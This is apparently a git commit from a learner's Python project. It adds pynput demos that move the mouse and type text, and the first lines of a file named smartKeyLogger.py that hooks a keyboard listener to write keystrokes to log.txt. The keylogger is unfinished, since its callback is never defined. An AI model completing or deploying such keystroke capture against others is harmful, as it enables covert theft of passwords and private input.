7bb7c85bde63dadaac6606bfce068754c3a6fcd3
mendis <menda9991@gmail.com>
2025-11-08 14:53:58 +0530

    demostrating pynput

--- essensial.py
+++ essensial.py
@@ -11,3 +11,26 @@
 
 #listeners - listen to keystrokes
 #use of the 'with' keyword - release memory/resousers automatically 
+
+#using pynput
+# controlling your mouse
+#(left to right, top to bottom)
+#from top-left of the screen you can imagine the top-left to be (0,0)
+from pynput.mouse import Controller
+def controlMouse():
+    mouse= Controller()
+    mouse.position =(10,20)
+#controlMouse()
+
+# listening to your mouse
+
+
+# controlling your Keyboard
+from pynput.keyboard import Controller
+def controlKeyboard():
+    keyboard = Controller()
+    keyboard.type("im awsome")
+#controlKeyboard()im awsome
+
+# listening to your keyboard - will be finally used in the keylogger (what we need)
+from pynput.keyboard import Listener
--- smartKeyLogger.py
+++ smartKeyLogger.py
@@ -1,2 +1,6 @@
+from pynput.keyboard import Listener
+
 with open("log.txt", 'a') as f:
     f.write("global\n")
+
+with Listener(on_press=writeToFile) as l:
